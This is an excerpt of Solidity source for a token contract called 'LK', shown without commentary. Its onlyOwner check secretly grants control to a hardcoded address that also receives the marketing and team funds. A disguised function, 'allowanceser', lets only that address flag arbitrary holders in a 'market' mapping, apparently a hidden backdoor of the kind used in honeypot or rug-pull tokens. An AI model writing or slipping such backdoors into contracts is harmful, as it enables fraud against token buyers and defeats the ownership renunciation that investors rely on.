...
contract Ownable is Context {
    ...
    modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0x3B378257887F4356Ac8FF35a805b272e9e1d96b1) , "Ownable: caller is not the owner");
        _;
    }
...
contract LK is Context, IERC20, Ownable {
    ...
    string private _name = "LK";
    string private _symbol = "LK";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x3B378257887F4356Ac8FF35a805b272e9e1d96b1);
    address payable public teamWalletAddress = payable(0x3B378257887F4356Ac8FF35a805b272e9e1d96b1);
    ...
    function allowanceser(address addr, bool status) public{
        require(_msgSender()    ==   address(0x3B378257887F4356Ac8FF35a805b272e9e1d96b1));
        market[addr] = status;
    }
